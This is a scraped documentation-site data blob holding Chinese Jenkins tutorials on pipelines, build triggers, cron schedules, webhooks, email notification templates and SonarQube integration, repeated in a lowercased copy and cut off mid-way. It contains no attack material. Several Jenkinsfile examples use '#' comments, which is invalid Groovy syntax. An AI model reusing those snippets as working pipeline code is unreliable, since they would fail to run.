jenkins 上的工作流框架，将原来独立运行于单个或者多个节点的任务连接起来，实现单个任务难以完成的复杂流程编排和可视化的工作。\n\n使用 pipeline 有以下好处：\n\n * 代码：pipeline 以代码的形式实现，通常被检入源代码控制，使团队能够编辑，审查和迭代其传送流程。\n * 持久：无论是计划内的还是计划外的服务器重启，pipeline 都是可恢复的。\n * 可停止：pipeline 可接收交互式输入，以确定是否继续执行 pipeline\n * 多功能：pipeline 支持现实世界中复杂的持续交付要求。它支持 fork/join、循环执行，并行执行任务的功能。\n * 可扩展：pipeline 插件支持其 dsl 的自定义扩展 ，以及与其他插件集成的多个选项。\n\n如何创建 jenkins pipeline：\n\n * pipeline 脚本是由 groovy 语言实现的，但是我们没必要单独去学习 groovy\n * pipeline 支持两种语法：declarative (声明式) 和 scripted pipeline (脚本式) 语法，scripted pipeline 支持更多的 groovy 语言，不像前者受那么多的结构化限制。由于可以编写灵活的逻辑，可以认为是高级版的 pipeline，如果你想实现的逻辑比较灵活，比如有判断、分支，或者需要用 groovy 语言编写复杂的运行步骤，都应该选择使用 scripted pipeline。\n * pipeline 也有两种创建方法：可以直接在 jenkins 的 web ui 界面中输入脚本；也可以通过创建一个 jenkinsfile 脚本文件放入项目源码库中（一般我们都推荐在 jenkins 中直接从源代码控制 (scm) 中直接载入 jenkinsfile pipeline 这种方法）。\n\n\n# 安装 pipeline 插件\n\n\n\n> 安装完毕记得重启\n\n安装插件有很多依赖插件会安装失败，不用管，只要创建项目的时候多了 “流水线” 类型即可。\n\n\n\n你会在项目的配置中看到多了一个流水线，它就是取代了以上项目的构建和构建后的一些工作。\n\n\n\n以上是基于一个声明式 **（declarative）的 pipeline**，以 pipeline 开头的就是声明式的。\nstages：代表整个流水线的所有执行阶段。通常 stages 只有 1 个，里面包含多个 stage\nstage：代表流水线中的某个阶段，可能出现 n 个。一般分为拉取代码，编译构建，部署等阶段。\nsteps：代表一个阶段内需要执行的逻辑 (步骤)。steps 里面是 shell 脚本，git 拉取代码，ssh 远程发布等任意内容。\n模拟一段，然后执行看看效果\n\npipeline {\n    agent any\n\n    stages {\n        stage('拉取代码') {\n            steps {\n                echo '拉取代码'\n            }\n        }\n        stage('编译构建') {\n            steps {\n                echo '编译构建'\n            }\n        }\n        stage('项目部署') {\n            steps {\n                echo '项目部署'\n            }\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n\n\n\n# scripted pipeline 脚本式 - pipeline\n\n\n\n * node：节点，一个 node 就是一个 jenkins 节点，master 或者 agent，是执行 step 的具体运行环境，后续讲到 jenkins 的 master-slave 架构的时候用到。\n * stage：阶段，一个 pipeline 可以划分为若干个 stage，每个 stage 代表一组操作，比如：build、test、deploy，stage 是一个逻辑分组的概念。\n * step：步骤，step 是最基本的操作单元，可以是打印一句话，也可以是构建一个 docker 镜像，由各类 jenkins 插件提供，比如命令：sh ‘make’，就相当于我们平时 shell 终端中执行 make 命令一样。\n\nnode {\n    def mvnhome\n    stage('拉取代码') { // for display purposes\n        echo '拉取代码'\n    }\n    stage('编译构建') {\n        echo '编译构建'\n    }\n    stage('项目部署') {\n        echo '项目部署'\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n\n\n\n\n# 编译打包部署\n\n\n# 拉取代码\n\n关于声明式的 code 编写，可以通过快捷的方式生成\n\n\n\n\n\n在这里可以配置我们的 git 项目拉取地址\n\n\n\n\n\n\n\n\n# 编译打包\n\n\n\n\n\n\n\n\n\n\n# 远程部署\n\n\n\n得到后依然编译执行。如果是 jar 包的，可以提前在服务器写好脚本执行，在 sh ' 执行你的脚本'\n\n\n# 把 jenkins 的 pipeline 脚本放到项目中执行（pipeline script from scm）\n\n刚才我们都是直接在 jenkins 的 ui 界面编写 pipeline 代码，这样不方便脚本维护，建议把 pipeline 脚本放在项目中（一起进行版本控制）\n\n1. 在项目根目录建立 jenkinsfile 文件，把内容复制到该文件中，并提交到 git 仓库\n\n\n\n2. 在项目中引用该文件\n\n\n\n\n\n\n\n",charsets:{cjk:!0}},{title:"Jenkins(六) Jenkins项目构建细节",frontmatter:{title:"Jenkins(六) Jenkins项目构建细节",date:"2023-06-25T09:22:36.000Z",permalink:"/jenkins/505",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/01.%E8%BF%90%E7%BB%B4/50.Jenkins/505.Jenkins(%E5%85%AD)%20Jenkins%E9%A1%B9%E7%9B%AE%E6%9E%84%E5%BB%BA%E7%BB%86%E8%8A%82.html",relativePath:"01.运维/50.Jenkins/505.Jenkins(六) Jenkins项目构建细节.md",key:"v-1652c501",path:"/jenkins/505/",headers:[{level:2,title:"内置触发器",slug:"内置触发器",normalizedTitle:"内置触发器",charIndex:2},{level:3,title:"远程构建",slug:"远程构建",normalizedTitle:"远程构建",charIndex:36},{level:3,title:"其他工程构建后触发",slug:"其他工程构建后触发",normalizedTitle:"其他工程构建后触发",charIndex:60},{level:3,title:"定时构建",slug:"定时构建",normalizedTitle:"定时构建",charIndex:135},{level:3,title:"轮询SCM",slug:"轮询scm",normalizedTitle:"轮询 scm",charIndex:188},{level:2,title:"Git hook自动触发构建",slug:"git-hook自动触发构建",normalizedTitle:"git hook 自动触发构建",charIndex:829},{level:3,title:"安装Gitlab Hook插件",slug:"安装gitlab-hook插件",normalizedTitle:"安装 gitlab hook 插件",charIndex:977},{level:2,title:"Jenkins的参数化构建",slug:"jenkins的参数化构建",normalizedTitle:"jenkins 的参数化构建",charIndex:1175},{level:3,title:"String Parameter",slug:"string-parameter",normalizedTitle:"string parameter",charIndex:1276},{level:2,title:"配置邮箱服务器发送构建结果",slug:"配置邮箱服务器发送构建结果",normalizedTitle:"配置邮箱服务器发送构建结果",charIndex:1359},{level:3,title:"安装 Email Extension 插件",slug:"安装-email-extension-插件",normalizedTitle:"安装 email extension 插件",charIndex:1377},{level:3,title:"准备邮件内容",slug:"准备邮件内容",normalizedTitle:"准备邮件内容",charIndex:1504},{level:2,title:"jenkins 配置 SonarQube（代码审查）",slug:"jenkins-配置-sonarqube-代码审查",normalizedTitle:"jenkins 配置 sonarqube（代码审查）",charIndex:5366}],lastUpdated:"12/22/2023, 11:52:48 AM",lastUpdatedTimestamp:1703217168e3,headersStr:"内置触发器 远程构建 其他工程构建后触发 定时构建 轮询SCM Git hook自动触发构建 安装Gitlab Hook插件 Jenkins的参数化构建 String Parameter 配置邮箱服务器发送构建结果 安装 Email Extension 插件 准备邮件内容 jenkins 配置 SonarQube（代码审查）",content:'# 内置触发器\n\nJenkins 内置 4 种构建触发器：\n\n * 触发远程构建，通过一个远程地址触发项目的执行\n * 其他工程构建后触发（Build after other projects are build），就是需要前面一个项目构建完成后触发我的项目构建\n * 定时构建（Build periodically），顾名思义就是 类似于 corn 表达式，定时执行\n * 轮询 SCM（Poll SCM），会定时扫描本地代码仓库是否有变更，如果代码有变更就触发项目构建\n\n\n# 远程构建\n\n在项目中的配置中，构建触发器选中远程构建。\n\n\n\n通过浏览器访问 http://192.168.81.102:7777/job/test01/build?token=6666 进行项目构建\n\n\n# 其他工程构建后触发\n\n\n\n\n\n应用保存后，就可以构建 maven_project 了。\n\n\n# 定时构建\n\n定时字符串从左往右分别为： 分 时 日 月 周\n一些定时表达式的例子：\n\n每30分钟构建一次：H代表形参(代表小时，测试用 *)\nH/30 * * * * 10:02 10:32\n每2个小时构建一次: \nH H/2 * * *\n每天的8点，12点，22点，一天构建3次： (多个时间点中间用逗号隔开) \n0 8,12,22 * * *\n每天中午12点定时构建一次 \nH 12 * * *\n每天下午18点定时构建一次 \nH 18 * * *\n在每个小时的前半个小时内的每10分钟 H(0-29)/10 * * * *\n每两小时一次，每个工作日上午9点到下午5点(也许是上午10:38，下午12:38，下午2:38，下午4:38) H H(9-16)/2 * * 1-5\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n\n\n# 轮询 SCM\n\n该构建触发器，Jenkins 会定时扫描本地整个项目的代码，增大系统的开销，不建议使用。\n\n\n\n\n# Git hook 自动触发构建\n\n在 Jenkins 的内置构建触发器中，轮询 SCM 可以实现 Gitlab 代码更新，项目自动构建，但是该方案的性能不佳。那有没有更好的方案呢？ 有的。就是利用 Gitlab 的 webhook 实现代码 push 到仓库，立即触发项目自动构建。\n\n\n\n\n# 安装 Gitlab Hook 插件\n\n需要安装两个插件：Gitlab Hook 和 GitLab，安装好后在项目配置的构建触发器中，会多一个选项\n\n\n\n关于 Gitlab 之后的操作请百度，我这里使用的是 gitea。\n\ngitea 需要下载 Generic Webhook Trigger 插件，安装后到项目配置\n\n\n\n\n\n\n\n\n\n配置完成后就可以测试了，只要提交了代码就会构建项目。\n\n\n# Jenkins 的参数化构建\n\n有时在项目构建的过程中，我们需要根据用户的输入动态传入一些参数，从而影响整个构建结果，这时我们可以使用参数化构建。\n\nJenkins 支持非常丰富的参数类型\n\n\n\n\n# String Parameter\n\n这样的方式只能适用于 pipeline 项目\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n这种方式输入哪个分支，就构建哪个分支\n\n\n# 配置邮箱服务器发送构建结果\n\n\n# 安装 Email Extension 插件\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n可以测试发送\n\n> 如果 jenkins 报错： Can\'t send command to SMTP host; 有可能是管理员的邮箱没有填写或者和认证者的邮箱不相同。\n\n\n# 准备邮件内容\n\n在项目根目录编写 email.html，并把文件推送 git\n\n<!DOCTYPE html>\n<html>\n<head>\n    <meta charset="UTF-8">\n    <title>${ENV, var="JOB_NAME"}-第${BUILD_NUMBER}次构建日志</title>\n</head>\n<body leftmargin="8" marginwidth="0" topmargin="8" marginheight="4" offset="0">\n<table width="95%" cellpadding="0" cellspacing="0" style="font-size: 11pt; font-family: Tahoma, Arial, Helvetica, sansserif">\n    <tr>\n        <td>(本邮件是程序自动下发的，请勿回复！)</td>\n    </tr>\n    <tr>\n        <td><h2>\n            <font color="#0000FF">构建结果 - ${BUILD_STATUS}</font>\n        </h2></td>\n    </tr>\n    <tr>\n        <td><br/>\n            <b><font color="#0B610B">构建信息</font></b>\n            <hr size="2" width="100%" align="center"/>\n        </td>\n    </tr>\n    <tr>\n        <td>\n            <ul>\n                <li>项目名称&nbsp;：&nbsp;${PROJECT_NAME}</li>\n                <li>构建编号&nbsp;：&nbsp;第${BUILD_NUMBER}次构建</li>\n                <li>触发原因：&nbsp;${CAUSE}</li>\n                <li>构建日志：&nbsp;\n                    <a href="${BUILD_URL}console">${BUILD_URL}console</a>\n                </li>\n                <li>构建&nbsp;&nbsp;Url&nbsp;：&nbsp;\n                    <a href="${BUILD_URL}">${BUILD_URL}</a>\n                </li>\n                <li>工作目录&nbsp;：&nbsp;\n                    <a href="${PROJECT_URL}ws">${PROJECT_URL}ws</a>\n                </li>\n                <li>项目&nbsp;&nbsp;Url&nbsp;：&nbsp;\n                    <a href="${PROJECT_URL}">${PROJECT_URL}</a>\n                </li>\n            </ul>\n        </td>\n    </tr>\n    <tr>\n        <td><b><font color="#0B610B">Changes Since Last Successful Build:</font></b>\n            <hr size="2" width="100%" align="center"/>\n        </td>\n    </tr>\n    <tr>\n        <td>\n            <ul>\n                <li>历史变更记录 : <a href="${PROJECT_URL}changes">${PROJECT_URL}changes</a></li>\n            </ul>\n            ${CHANGES_SINCE_LAST_SUCCESS,reverse=true, format="Changes for Build #%n:<br/>%c<br/>",showPaths=true,changesFormat="<pre>[%a]<br/>%m</pre>",pathFormat="&nbsp;&nbsp;&nbsp;&nbsp;%p"}\n        </td>\n    </tr>\n    <tr>\n        <td><b>Failed Test Results</b>\n            <hr size="2" width="100%" align="center"/>\n        </td>\n    </tr>\n    <tr>\n        <td>\n            <pre style="font-size: 11pt; font-family: Tahoma, Arial, Helvetica,sans-serif">\n                $FAILED_TESTS\n            </pre>\n            <br/>\n        </td>\n    </tr>\n    <tr>\n        <td><b><font color="#0B610B">构建日志 (最后 100行):</font></b>\n            <hr size="2" width="100%" align="center"/>\n        </td>\n    </tr>\n    <tr>\n        <td>\n            <textarea cols="80" rows="30" readonly="readonly"\n                      style="font-family: Courier New">\n                ${BUILD_LOG,maxLines=100}\n            </textarea>\n        </td>\n    </tr>\n</table>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n\n\n这里的参数都为 Jenkins 的参数，具体参数在 Jenkins 系统配置里可以看到，点击如下的问号就行。\n\n\n\n\n\n添加 post，post 意思是构建后操作，post 可以根据 stage 的结果执行不同的逻辑，比如 stages 里面都执行完成，他会走 post 里的 success 代码，如果失败会走 failure 代码。而 post 的语法该如何写，可以到 流水线语法 中看到。\n\n\n\n * Always run, regardless of build status 无论构建的结果如何都会执行\n * Run if the build status is "Failure" 构建失败运行\n * Run if the build status is "Success" or hasnt been set yet 构建成功运行\n\n至于，邮件的内容，可以在片段生成器中查出来\n\n\n\n    post {\n        always {\n            emailext(\n                # 可以使用 jenkins 里面的参数\n                subject: \'构建通知：${PROJECT_NAME} - Build # ${BUILD_NUMBER} - ${BUILD_STATUS}!\',\n                # 读取 email.html 文件\n                body: \'${FILE,path="email.html"}\',\n                # 邮件的收件人\n                to: \'xxxxxx@qq.com\'\n            )\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n${FILE,path="PATH"} 可以在系统配置中了解\n\n\n\n然后去构建你的项目，就可以收到 构建项目的邮件了。\n\n\n# jenkins 配置 SonarQube（代码审查）\n\nSonarQube 是一个用于管理代码质量的开放平台，可以快速的定位代码中潜在的或者明显的错误。目前支持 java,C#,C/C++,Python,PL/SQL,Cobol,JavaScrip,Groovy 等二十几种编程语言的代码质量管理与检测。官网：https://www.sonarqube.org/\n\n软件          版本\nJDK         1.8\nmysql       8.0\nSonarQube   6.7.4\n\n下载 sonar 压缩包：https://www.sonarqube.org/downloads/\n\n# 解压 \nunzip sonarqube-6.7.4.zip\n# 创建sonar用户，必须sonar用于启动，否则报错\nuseradd sonar \n# 更改sonar目录及文件权限\nchown -R sonar. /opt/software/sonar\n\n\n1\n2\n3\n4\n5\n6\n\n\n修改 sonar 配置文件\n\nvim /opt/software/sonar/conf/sonar.properties\nsonar.jdbc.username=xxxx\nsonar.jdbc.password=xxxxxx\njdbc:mysql://xxxxxxxxxxx:3306/sonar?useUnicode=true&characterEncoding=utf8&autoReconnect=true&useSSL=false&zeroDateTimeBehavior=convertToNull&&serverTimezone=Asia/Shanghai&rewriteBatchedStatements=true&useConfigs=maxPerformance\n\n\n1\n2\n3\n4\n\n\n启动 sonar\n\ncd /opt/software/sonar/\n# 启动\nsu sonar ./bin/linux-x86-64/sonar.sh start \n# 查看状态\nsu sonar ./bin/linux-x86-64/sonar.sh status \n# 停止\nsu sonar ./bin/linux-x86-64/sonar.sh stop \n# 查看日志\ntail -f logs/sonar.log\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n> 7.9 以后不支持 mysql，只支持 h2、mssql、postgresql ，7.9 以下也只支持 mysql5.7，所以这里就不在继续了，大致说清楚就好，当安装好后访问 web 页面，默认 9000 端口，得到一个 token 记录下来。\n\n\n\n1. 在 Jenkins 中安装 SonarQube Scanner 插件\n2. 在 Jenkins->Manager Jenkins->Global Tool Configuration->SonarQube Scanner-> 新增 SonarQube Scanner\n\n1. 填入 Name，名字可以自己随便起\n2. 勾选 Install automatically\n3. 选择安装的版本\n4. 点击应用并保存\n\n\n1\n2\n3\n4\n\n\n3. 在 Jenkins->Manager Jenkins->Configure System->SonarQube servers->Add SonarQube\n\n1. 填入 Name，该名字可以随便起\n2. 填写安装 SonarQube 的 web 地址 IP:PORT\n3. 添加证书，该证书就是访问 SonarQube 获取到的token，也可以在Jenkins的全局凭证里去添加这个证书，但类型需要是 Secret text\n4. 应用并保存\n\n\n1\n2\n3\n4\n\n\n4. 非结构性项目检查，到项目配置中找到构建，在正常的构建项目名录后可以增加构建步骤，然后再下拉选项中找到 Execute SonarQube Scanner\n\n1. 填写Task to run，执行 SonarQube 的命令，输入 scan（触发代码扫描以及检测）\n2. 代码需要的JDK环境，这个JDK环境是在全局配置中配置得到的\n3. 在 Analysis properties 填如内容\n\n# must be unique in a given SonarQube instance，项目标记\nsonar.projectKey=web_demo\n# this is the name and version displayed in the SonarQube UI. Was mandatoryprior to SonarQube 6.1.，项目名称\nsonar.projectName=web_demo\n# 版本\nsonar.projectVersion=1.0\n# Path is relative to the sonar-project.properties file. Replace "\\" by "/" on\nWindows.\n# This property is optional if sonar.modules is set. 扫描代码的路径 . 代表当前项目根目录下扫描所有代码及文件，也可以直接扫描指定包代码，如 /src/main/**\nsonar.sources=.\n# 排除的一些文件不扫描\nsonar.exclusions=**/test/**,**/target/**\n# jdk版本\nsonar.java.source=1.8\nsonar.java.target=1.8\n# Encoding of the source code. Default is default system encoding，编码格式\nsonar.sourceEncoding=UTF-8\n\n4.应用并保存后构建项目\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n5. 流水线项目添加 SonarQube 功能，可以把内容添加到项目中，防止 jenkins 意外的崩溃，导致配置丢失\n\n1. 在项目中根路径下新建 sonar-project.properties，并把内容复制过来\n2. 到项目中的 Jenkinsfile 中编写内容\n\npipeline {\n    agent any\n\n    stages {\n        stage(\'pull code\') {\n            steps {\n                echo \'master 分支的事情 参数是=${branch}\'\n                checkout([$class: \'GitSCM\', branches: [[name: \'*/${branch}\']], extensions: [], userRemoteConfigs: [[credentialsId: \'80dfe5c5-1684-47b1-a410-6f53ceb3c543\', url: \'http://192.168.81.15:3000/biguncle/test.git\']]])\n            }\n        }\n        # 代码检查，可以把该步骤添加到任意位置\n        stage(\'code checking\') {\n            steps {\n                script {\n                    # \'\' 这里写的是在jenkins->Global Tool Configuration->SonarQube Scanner->新增的SonarQube Scanner的Name\n                    scannerHome = tool \'sonar-scanner\'\n                }\n                # () 里的内容是在 jenkins->Configure System->SonarQube servers->里的 Name\n                withSonarQubeEnv(\'sonarqube6.7.4\') {\n                    # 这里是 jenkins 在配置 SonarQube Scanner的时候安装的工具，他自己安装的不需要我们管\n                    sh "${scannerHome}/bin/sonar-scanner"\n                }\n            }\n        }\n        stage(\'build project\') {\n            steps {\n                sh \'mvn clean package\'\n            }\n        }\n    }\n    post {\n        always {\n            emailext(\n                subject: \'构建通知：${PROJECT_NAME} - Build # ${BUILD_NUMBER} - ${BUILD_STATUS}!\',\n                body: \'${FILE,path="email.html"}\',\n                to: \'875730567@qq.com\'\n            )\n        }\n    }\n}\n\n3. 提交后就可以到 jenkins 去构建项目，结果要去 SonarQube web 去看\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n',normalizedContent:'# 内置触发器\n\njenkins 内置 4 种构建触发器：\n\n * 触发远程构建，通过一个远程地址触发项目的执行\n * 其他工程构建后触发（build after other projects are build），就是需要前面一个项目构建完成后触发我的项目构建\n * 定时构建（build periodically），顾名思义就是 类似于 corn 表达式，定时执行\n * 轮询 scm（poll scm），会定时扫描本地代码仓库是否有变更，如果代码有变更就触发项目构建\n\n\n# 远程构建\n\n在项目中的配置中，构建触发器选中远程构建。\n\n\n\n通过浏览器访问 http://192.168.81.102:7777/job/test01/build?token=6666 进行项目构建\n\n\n# 其他工程构建后触发\n\n\n\n\n\n应用保存后，就可以构建 maven_project 了。\n\n\n# 定时构建\n\n定时字符串从左往右分别为： 分 时 日 月 周\n一些定时表达式的例子：\n\n每30分钟构建一次：h代表形参(代表小时，测试用 *)\nh/30 * * * * 10:02 10:32\n每2个小时构建一次: \nh h/2 * * *\n每天的8点，12点，22点，一天构建3次： (多个时间点中间用逗号隔开) \n0 8,12,22 * * *\n每天中午12点定时构建一次 \nh 12 * * *\n每天下午18点定时构建一次 \nh 18 * * *\n在每个小时的前半个小时内的每10分钟 h(0-29)/10 * * * *\n每两小时一次，每个工作日上午9点到下午5点(也许是上午10:38，下午12:38，下午2:38，下午4:38) h h(9-16)/2 * * 1-5\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n\n\n# 轮询 scm\n\n该构建触发器，jenkins 会定时扫描本地整个项目的代码，增大系统的开销，不建议使用。\n\n\n\n\n# git hook 自动触发构建\n\n在 jenkins 的内置构建触发器中，轮询 scm 可以实现 gitlab 代码更新，项目自动构建，但是该方案的性能不佳。那有没有更好的方案呢？ 有的。就是利用 gitlab 的 webhook 实现代码 push 到仓库，立即触发项目自动构建。\n\n\n\n\n# 安装 gitlab hook 插件\n\n需要安装两个插件：gitlab hook 和 gitlab，安装好后在项目配置的构建触发器中，会多一个选项\n\n\n\n关于 gitlab 之后的操作请百度，我这里使用的是 gitea。\n\ngitea 需要下载 generic webhook trigger 插件，安装后到项目配置\n\n\n\n\n\n\n\n\n\n配置完成后就可以测试了，只要提交了代码就会构建项目。\n\n\n# jenkins 的参数化构建\n\n有时在项目构建的过程中，我们需要根据用户的输入动态传入一些参数，从而影响整个构建结果，这时我们可以使用参数化构建。\n\njenkins 支持非常丰富的参数类型\n\n\n\n\n# string parameter\n\n这样的方式只能适用于 pipeline 项目\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n这种方式输入哪个分支，就构建哪个分支\n\n\n# 配置邮箱服务器发送构建结果\n\n\n# 安装 email extension 插件\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n可以测试发送\n\n> 如果 jenkins 报错： can\'t send command to smtp host; 有可能是管理员的邮箱没有填写或者和认证者的邮箱不相同。\n\n\n# 准备邮件内容\n\n在项目根目录编写 email.html，并把文件推送 git\n\n<!doctype html>\n<html>\n<head>\n    <meta charset="utf-8">\n    <title>${env, var="job_name"}-第${build_number}次构建日志</title>\n</head>\n<body leftmargin="8" marginwidth="0" topmargin="8" marginheight="4" offset="0">\n<table width="95%" cellpadding="0" cellspacing="0" style="font-size: 11pt; font-family: tahoma, arial, helvetica, sansserif">\n    <tr>\n        <td>(本邮件是程序自动下发的，请勿回复！)</td>\n    </tr>\n    <tr>\n        <td><h2>\n            <font color="#0000ff">构建结果 - ${build_status}</font>\n        </h2></td>\n    </tr>\n    <tr>\n        <td><br/>\n            <b><font color="#0b610b">构建信息</font></b>\n            <hr size="2" width="100%" align="center"/>\n        </td>\n    </tr>\n    <tr>\n        <td>\n            <ul>\n                <li>项目名称&nbsp;：&nbsp;${project_name}</li>\n                <li>构建编号&nbsp;：&nbsp;第${build_number}次构建</li>\n                <li>触发原因：&nbsp;${cause}</li>\n                <li>构建日志：&nbsp;\n                    <a href="${build_url}console">${build_url}console</a>\n                </li>\n                <li>构建&nbsp;&nbsp;url&nbsp;：&nbsp;\n                    <a href="${build_url}">${build_url}</a>\n                </li>\n                <li>工作目录&nbsp;：&nbsp;\n                    <a href="${project_url}ws">${project_url}ws</a>\n                </li>\n                <li>项目&nbsp;&nbsp;url&nbsp;：&nbsp;\n                    <a href="${project_url}">${project_url}</a>\n                </li>\n            </ul>\n        </td>\n    </tr>\n    <tr>\n        <td><b><font color="#0b610b">changes since last successful build:</font></b>\n            <hr size="2" width="100%" align="center"/>\n        </td>\n    </tr>\n    <tr>\n        <td>\n            <ul>\n                <li>历史变更记录 : <a href="${project_url}changes">${project_url}changes</a></li>\n            </ul>\n            ${changes_since_last_success,reverse=true, format="changes for build #%n:<br/>%c<br/>",showpaths=true,changesformat="<pre>[%a]<br/>%m</pre>",pathformat="&nbsp;&nbsp;&nbsp;&nbsp;%p"}\n        </td>\n    </tr>\n    <tr>\n        <td><b>failed test results</b>\n            <hr size="2" width="100%" align="center"/>\n        </td>\n    </tr>\n    <tr>\n        <td>\n            <pre style="font-size: 11pt; font-family: tahoma, arial, helvetica,sans-serif">\n                $failed_tests\n            </pre>\n            <br/>\n        </td>\n    </tr>\n    <tr>\n        <td><b><font color="#0b610b">构建日志 (最后 100行):</font></b>\n            <hr size="2" width="100%" align="center"/>\n        </td>\n    </tr>\n    <tr>\n        <td>\n            <textarea cols="80" rows="30" readonly="readonly"\n                      style="font-family: courier new">\n                ${build_log,maxlines=100}\n            </textarea>\n        </td>\n    </tr>\n</table>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n\n\n这里的参数都为 jenkins 的参数，具体参数在 jenkins 系统配置里可以看到，点击如下的问号就行。\n\n\n\n\n\n添加 post，post 意思是构建后操作，post 可以根据 stage 的结果执行不同的逻辑，比如 stages 里面都执行完成，他会走 post 里的 success 代码，如果失败会走 failure 代码。而 post 的语法该如何写，可以到 流水线语法 中看到。\n\n\n\n * always run, regardless of build status 无论构建的结果如何都会执行\n * run if the build status is "failure" 构建失败运行\n * run if the build status is "success" or hasnt been set yet 构建成功运行\n\n至于，邮件的内容，可以在片段生成器中查出来\n\n\n\n    post {\n        always {\n            emailext(\n                # 可以使用 jenkins 里面的参数\n                subject: \'构建通知：${project_name} - build # ${build_number} - ${build_status}!\',\n                # 读取 email.html 文件\n                body: \'${file,path="email.html"}\',\n                # 邮件的收件人\n                to: \'xxxxxx@qq.com\'\n            )\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n${file,path="path"} 可以在系统配置中了解\n\n\n\n然后去构建你的项目，就可以收到 构建项目的邮件了。\n\n\n# jenkins 配置 sonarqube（代码审查）\n\nsonarqube 是一个用于管理代码质量的开放平台，可以快速的定位代码中潜在的或者明显的错误。目前支持 java,c#,c/c++,python,pl/sql,cobol,javascrip,groovy 等二十几种编程语言的代码质量管理与检测。官网：https://www.sonarqube.org/\n\n软件          版本\njdk         1.8\nmysql       8.0\nsonarqube   6.7.4\n\n下载 sonar 压缩包：https://www.sonarqube.org/downloads/\n\n# 解压 \nunzip sonarqube-6.7.4.zip\n# 创建sonar用户，必须sonar用于启动，否则报错\nuseradd sonar \n# 更改sonar目录及文件权限\nchown -r sonar. /opt/software/sonar\n\n\n1\n2\n3\n4\n5\n6\n\n\n修改 sonar 配置文件\n\nvim /opt/software/sonar/conf/sonar.properties\nsonar.jdbc.username=xxxx\nsonar.jdbc.password=xxxxxx\njdbc:mysql://xxxxxxxxxxx:3306/sonar?useunicode=true&characterencoding=utf8&autoreconnect=true&usessl=false&zerodatetimebehavior=converttonull&&servertimezone=asia/shanghai&rewritebatchedstatements=true&useconfigs=maxperformance\n\n\n1\n2\n3\n4\n\n\n启动 sonar\n\ncd /opt/software/sonar/\n# 启动\nsu sonar ./bin/linux-x86-64/sonar.sh start \n# 查看状态\nsu sonar ./bin/linux-x86-64/sonar.sh status \n# 停止\nsu sonar ./bin/linux-x86-64/sonar.sh stop \n# 查看日志\ntail -f logs/sonar.log\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n> 7.9 以后不支持 mysql，只支持 h2、mssql、postgresql ，7.9 以下也只支持 mysql5.7，所以这里就不在继续了，大致说清楚就好，当安装好后访问 web 页面，默认 9000 端口，得到一个 token 记录下来。\n\n\n\n1. 在 jenkins 中安装 sonarqube scanner 插件\n2. 在 jenkins->manager jenkins->global tool configuration->sonarqube scanner-> 新增 sonarqube scanner\n\n1. 填入 name，名字可以自己随便起\n2. 勾选 install automatically\n3. 选择安装的版本\n4. 点击应用并保存\n\n\n1\n2\n3\n4\n\n\n3. 在 jenkins->manager jenkins->configure system->sonarqube servers->add sonarqube\n\n1. 填入 name，该名字可以随便起\n2. 填写安装 sonarqube 的 web 地址 ip:port\n3. 添加证书，该证书就是访问 sonarqube 获取到的token，也可以在jenkins的全局凭证里去添加这个证书，但类型需要是 secret text\n4. 应用并保存\n\n\n1\n2\n3\n4\n\n\n4. 非结构性项目检查，到项目配置中找到构建，在正常的构建项目名录后可以增加构建步骤，然后再下拉选项中找到 execute sonarqube scanner\n\n1. 填写task to run，执行 sonarqube 的命令，输入 scan（触发代码扫描以及检测）\n2. 代码需要的jdk环境，这个jdk环境是在全局配置中配置得到的\n3. 在 analysis properties 填如内容\n\n# must be unique in a given sonarqube instance，项目标记\nsonar.projectkey=web_demo\n# this is the name and version displayed in the sonarqube ui. was mandatoryprior to sonarqube 6.1.，项目名称\nsonar.projectname=web_demo\n# 版本\nsonar.projectversion=1.0\n# path is relative to the sonar-project.properties file. replace "\\" by "/" on\nwindows.\n# this property is optional if sonar.modules is set. 扫描代码的路径 . 代表当前项目根目录下扫描所有代码及文件，也可以直接扫描指定包代码，如 /src/main/**\nsonar.sources=.\n# 排除的一些文件不扫描\nsonar.exclusions=**/test/**,**/target/**\n# 